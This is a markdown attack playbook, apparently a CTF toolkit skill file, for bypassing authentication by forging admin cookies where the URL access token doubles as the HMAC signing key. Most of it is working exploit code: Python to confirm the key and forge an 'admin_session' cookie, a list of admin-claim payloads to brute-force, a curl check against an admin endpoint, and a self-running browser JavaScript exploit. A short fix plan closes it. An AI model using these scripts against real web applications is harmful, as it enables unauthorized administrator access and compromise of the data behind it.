# Cookie HMAC key reuse → Backend authentication bypass

> When the server uses the publicly exposed access token in the URL as the cookie signing key, and directly trusts the claims in the cookie payload on the backend, it is possible to forge an administrator identity.

---

## Applicable Scenarios

- Targeting web applications, the URL path contains parameters such as `access_token` / `token` / `key`
- The response header has set a signed cookie (e.g., `student_gate=<payload>.<signature>`)
- There is a possibility that multiple signed cookies (student side + admin side) share one key
- The backend Cookie payload contains client-controllable permission declarations (such as `{"admin":true}`)

## Keywords

- HMAC key reuse / Signature key reuse
- Known-key session forgery / Known-key session forgery
- Client-side claims-based auth / Client-side declarative permissions
- Cookie signature bypass / Cookie signature bypass

## Attack Process

### Step 1: Extract access token from URL

Typically visible in the entry URL:

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

Extract token:

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2: Observe the student_gate Cookie

Access entry, the response header will set a signature Cookie. The format is usually:

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

Decode the payload to confirm the content structure.

### Step 3: Verify the Signature Algorithm

Use the known access token as the HMAC key to attempt to reproduce the signature:

```python
import hmac, hashlib, base64

access_token = "从URL提取的token"
payload_b64 = "从Cookie提取的payload部分"
expected_sig = "从Cookie提取的签名部分"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("匹配" if computed == expected_sig else "不匹配")
```

If it matches → confirm xKx0000xKx.

### Step 4: Guess the management-side Cookie name and payload structure

Common management-side cookie names:

- xKx0001xKx
- xKx0002xKx
- xKx0003xKx
- xKx0004xKx
- xKx0005xKx

Payload structure probing direction (try one by one until a 200 is hit):

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5: Forging the Admin Cookie

```python
import hmac, hashlib, json, base64

access_token = "已知的token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6: Verify Backend Permissions

```bash
curl -k -H "Cookie: <上一步得到的cookie>" https://target/api/admin/me
```

Return `{"admin":true}` or 200 + admin data to succeed.

## Browser Reproduction

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## Fix Plan

1. Use a server-side independent key to sign cookies, not shared with URL tokens
2. Backend permissions are based on server-side sessions, rather than client-side Cookie payload declarations
3. Different roles use different signature keys
4. Add statements such as `iat` / `exp` / `typ` to the Cookie and verify
5. Silently handle signature parsing exceptions (return 401 on failure, do not return 500)

## Related Cases

- class.pangbaoba.me CTF target backend bypass (student_gate and admin_session share the same access token as HMAC key, `{"admin":true}` directly obtains administrator privileges)

## Related Skills

- `CTF-Sandbox-Orchestrator/competition-web-runtime/README.md` — Web Runtime Analysis
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/README.md` — Similar to token declaration obfuscation
- `reverse-engineering/languages-platforms.md` — JWT / OAuth related